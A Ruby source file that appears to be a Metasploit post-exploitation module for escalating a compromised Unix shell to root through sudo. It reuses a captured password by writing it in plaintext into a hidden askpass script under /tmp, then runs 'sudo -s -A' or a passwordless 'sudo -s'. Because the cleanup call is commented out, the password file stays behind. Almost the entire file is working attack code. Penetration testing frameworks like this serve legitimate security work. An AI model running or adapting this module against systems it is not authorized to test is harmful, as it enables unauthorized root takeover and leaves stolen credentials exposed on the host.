##
# ## This file is part of the Metasploit Framework and may be subject to
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'rex'

class Metasploit3 < Msf::Post

  include Msf::Post::File
  include Msf::Post::Linux::Priv
  include Msf::Post::Linux::System


  def initialize(info={})
    super( update_info( info,
        'Name'          => 'Multiple Linux / Unix Post Sudo Upgrade Shell',
        'Description'   => %q{
          This module attempts to upgrade a shell account to UID 0 by reusing the
          given password and passing it to sudo. This technique relies on sudo
          versions from 2008 and later which support -A.
        },
        'License'       => MSF_LICENSE,
        'Author'        =>
          [
            'todb <todb[at]metasploit.com>',
            'Ryan Baxendale <rbaxendale[at]gmail.com>' #added password option
          ],
        'Platform'      => %w{ aix linux osx solaris unix },
        'References'    =>
          [
            # Askpass first added March 2, 2008, looks like
            [ 'URL', 'http://www.sudo.ws/repos/sudo/file/05780f5f71fd/sudo.h']
          ],
        'SessionTypes'  => [ 'shell' ] # Need to test 'meterpreter'
      ))

      register_options(
        [
          OptString.new('PASSWORD', [false, 'The password to use when running sudo.'])
        ], self.class)
  end

  # Run Method for when run command is issued
  def run
    print_status("SUDO: Attempting to upgrade to UID 0 via sudo")
    sudo_bin = cmd_exec("which sudo")
    if is_root?
      print_status "Already root, so no need to upgrade permissions. Aborting."
      return
    end
    if sudo_bin.empty?
      print_error "No sudo binary available. Aborting."
      return
    end
    get_root()
  end

  def get_root
    if datastore['PASSWORD']
      password = datastore['PASSWORD']
    else
      password = session.exploit_datastore['PASSWORD']
    end

    if password.to_s.empty?
      print_status "No password available, trying a passwordless sudo."
    else
      print_status "Sudoing with password `#{password}'."
    end
    askpass_sudo(password)
    unless is_root?
      print_error "SUDO: Didn't work out, still a mere user."
    else
      print_good "SUDO: Root shell secured."
      report_note(
        :host => session,
        :type => "host.escalation",
        :data => "User `#{session.exploit_datastore['USERNAME']}' sudo'ed to a root shell"
      )
    end
  end

  # TODO: test on more platforms
  def askpass_sudo(password)
    if password.to_s.empty?
      begin
        ::Timeout.timeout(30) do
          cmd_exec("sudo -s")
        end
      rescue ::Timeout::Error
        print_error "SUDO: Passwordless sudo timed out. Might be blocking."
      rescue
        print_error "SUDO: Passwordless sudo failed. Check the session log."
      end
    else
      askpass_sh = "/tmp/." + Rex::Text.rand_text_alpha(7)
      begin
        # Telnet can be pretty pokey, allow about 20 seconds per cmd_exec
        # Generally will be much snappier over ssh.
        # Need to timeout in case there's a blocking prompt after all
        ::Timeout.timeout(120) do
          vprint_status "Writing the SUDO_ASKPASS script: #{askpass_sh}"
          cmd_exec("echo \\#\\!/bin/sh > #{askpass_sh}") # Cursed csh
          cmd_exec("echo echo #{password} >> #{askpass_sh}")
          vprint_status "Setting executable bit."
          cmd_exec("chmod +x #{askpass_sh}")
          vprint_status "Setting environment variable."
          # Bruteforce the set command. At least one should work.
          cmd_exec("setenv SUDO_ASKPASS #{askpass_sh}")
          cmd_exec("export SUDO_ASKPASS=#{askpass_sh}")
          vprint_status "Executing sudo -s -A"
          cmd_exec("sudo -s -A")
        end
      rescue ::Timeout::Error
        print_error "SUDO: Sudo with a password timed out."
      rescue
        print_error "SUDO: Sudo with a password failed. Check the session log."
      end
      # askpass_cleanup(askpass_sh)
    end
  end

  def askpass_cleanup(askpass_sh)
    begin
      ::Timeout.timeout(20) do
        vprint_status "Deleting the SUDO_ASKPASS script."
        cmd_exec("rm #{askpass_sh}")
      end
    rescue ::Timeout::Error
      print_error "Timed out during sudo cleanup."
    end
  end

end
